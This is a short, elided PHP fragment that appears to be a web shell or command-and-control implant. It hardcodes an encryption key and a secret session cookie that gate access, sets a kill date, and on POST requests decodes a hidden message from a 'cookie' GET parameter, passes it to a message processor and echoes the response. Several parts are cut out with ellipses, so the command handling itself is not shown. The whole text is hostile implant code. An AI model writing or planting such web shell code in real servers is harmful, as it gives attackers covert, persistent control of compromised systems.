...
<?php
$encryption_key = "CSkBsSZyHFrnnGVzxIOUW7D1aN0tEARki+5zZi0XKp8=";
$cookie_value = "080a9afb-1bdd-4be2-9799-bf7ee7351407";
$cookie_name = "session";
$killdate = strtotime("2025-03-11");
...
if($_COOKIE["session"] != base64_encode($cookie_value)){
	abort_call();
}
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	...
	$full_message = base64url_decode( $_GET["cookie"] );
	$full_message = substr($full_message, 36);
	$response = process_message($full_message);
	echo return_message($response);
}else{
